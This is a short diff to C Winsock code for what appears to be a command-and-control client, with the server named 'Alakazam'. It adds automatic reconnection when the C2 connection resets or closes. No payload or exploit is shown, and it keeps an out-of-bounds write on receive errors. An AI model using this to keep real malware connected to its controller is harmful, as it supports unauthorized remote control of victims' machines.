@@ -74,6 +74,12 @@ void start_client() {
   connect_to_cnc();
 }
 
+void restart_client() {
+  closesocket(*cnc);
+  init_cnc_sock();
+  connect_to_cnc();
+}
+
 void send_to_cnc(char *buf) {
   int res = send(*cnc, buf, strlen(buf), 0);
   if (res == SOCKET_ERROR) {
@@ -87,13 +93,16 @@ char *recv_from_cnc(int bufsize) {
   int bytesread = recv(*cnc, buf, bufsize, 0);
   buf[bytesread] = '\0';
   if (bytesread == SOCKET_ERROR) {
-    printf("Failed receiving from Alakazam: %d\n", WSAGetLastError());
-    exit(1);
+    int err_code = WSAGetLastError();
+    if (err_code == WSAECONNRESET) {
+      restart_client();
+      return recv_from_cnc(bufsize);
+    } else {
+      printf("Failed receiving from Alakazam: %d\n", err_code);
+      exit(1);
+    }
   } else if (bytesread == 0) {
-    printf("Alakazam closed the connection.\n");
-    closesocket(*cnc);
-    init_cnc_sock();
-    connect_to_cnc();
+    restart_client();
     return recv_from_cnc(bufsize);
   }
   return buf;
